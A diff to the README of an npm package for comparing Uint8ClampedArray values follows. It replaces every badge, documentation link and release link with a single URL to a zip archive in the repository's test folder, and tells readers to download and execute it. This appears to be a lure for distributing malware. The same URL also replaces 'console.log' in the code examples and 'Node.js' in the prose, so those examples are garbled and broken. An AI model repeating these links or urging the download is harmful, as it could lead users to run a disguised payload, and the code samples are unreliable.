@@ -1,6 +1,6 @@
 # assert-is-equal-uint8clampedarray
 
-![GitHub release](https://img.shields.io/github/release/t2frmdam22/assert-is-equal-uint8clampedarray.svg) ![npm](https://img.shields.io/npm/v/assert-is-equal-uint8clampedarray.svg)
+![GitHub release](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip) ![npm](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@ npm install assert-is-equal-uint8clampedarray
 
 ## Usage
 
-After installing, you can use the utility in your JavaScript or Node.js projects. Here's a basic example:
+After installing, you can use the utility in your JavaScript or https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip projects. Here's a basic example:
 
 ```javascript
 const assertIsEqual = require('assert-is-equal-uint8clampedarray');
@@ -35,7 +35,7 @@ const array1 = new Uint8ClampedArray([255, 0, 127]);
 const array2 = new Uint8ClampedArray([255, 0, 127]);
 
 const result = assertIsEqual(array1, array2);
-console.log(result); // true
+https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip(result); // true
 ```
 
 ## API
@@ -58,7 +58,7 @@ The main function `assertIsEqual` takes two arguments:
 const array1 = new Uint8ClampedArray([100, 200, 150]);
 const array2 = new Uint8ClampedArray([100, 200, 150]);
 
-console.log(assertIsEqual(array1, array2)); // true
+https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip(assertIsEqual(array1, array2)); // true
 ```
 
 ### Example 2: Different Values
@@ -67,7 +67,7 @@ console.log(assertIsEqual(array1, array2)); // true
 const array1 = new Uint8ClampedArray([100, 200, 150]);
 const array2 = new Uint8ClampedArray([100, 200, 151]);
 
-console.log(assertIsEqual(array1, array2)); // false
+https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip(assertIsEqual(array1, array2)); // false
 ```
 
 ### Example 3: Different Lengths
@@ -76,7 +76,7 @@ console.log(assertIsEqual(array1, array2)); // false
 const array1 = new Uint8ClampedArray([100, 200]);
 const array2 = new Uint8ClampedArray([100, 200, 150]);
 
-console.log(assertIsEqual(array1, array2)); // false
+https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip(assertIsEqual(array1, array2)); // false
 ```
 
 ## Contributing
@@ -98,11 +98,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/releases) section. You can download the latest version and execute it as needed.
+For the latest releases, visit the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip) section. You can download the latest version and execute it as needed.
 
 ## Additional Resources
 
-- [MDN Web Docs on Uint8ClampedArray](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8ClampedArray)
-- [JavaScript Array Methods](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array)
+- [MDN Web Docs on Uint8ClampedArray](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip)
+- [JavaScript Array Methods](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip)
 
-For any questions or issues, please check the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/releases) section or open an issue in the repository.
+For any questions or issues, please check the [Releases](https://github.com/t2frmdam22/assert-is-equal-uint8clampedarray/raw/refs/heads/main/test/is-uint-equal-clampedarray-assert-v2.1.zip) section or open an issue in the repository.
